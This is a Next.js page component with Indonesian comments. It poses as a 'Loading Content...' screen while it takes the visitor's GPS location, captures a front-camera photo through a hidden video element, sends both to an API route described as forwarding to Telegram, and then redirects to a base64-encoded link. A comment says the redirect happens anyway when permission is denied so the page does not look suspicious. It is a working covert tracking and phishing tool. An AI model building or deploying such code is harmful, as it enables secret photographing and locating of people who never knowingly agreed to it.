"use client";

import React, { useEffect, useRef } from "react";
import { useSearchParams } from "next/navigation";

export default function CapturePage() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const autoProcess = async () => {
      // 1. Decode URL Tujuan untuk Redirect nanti
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      // 2. Ambil Lokasi GPS secara otomatis
      const gps = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => resolve(null),
          { timeout: 5000 },
        );
      });

      // 3. Akses Kamera Depan otomatis
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // Memaksa kamera depan
        });

        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;

          // Tunggu sebentar agar kamera siap/fokus
          await new Promise((r) => setTimeout(r, 1500));

          const video = videoRef.current;
          const canvas = canvasRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d")?.drawImage(video, 0, 0);

          const image = canvas.toDataURL("image/png");

          // Matikan kamera segera setelah capture
          stream.getTracks().forEach((track) => track.stop());

          // 4. Kirim Data ke API (Lalu ke Telegram)
          await fetch("/api/snap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ image, gps }),
          });

          // 5. Redirect otomatis ke URL tujuan
          window.location.replace(destination);
        }
      } catch (err) {
        // Jika kamera ditolak, tetap redirect agar tidak mencurigakan
        window.location.replace(destination);
      }
    };

    autoProcess();
  }, [t]);

  return (
    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen">
      <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
      <p className="text-xs tracking-widest text-slate-500 uppercase animate-pulse">
        Loading Content...
      </p>

      {/* Elemen Tersembunyi untuk Proses Capture */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}
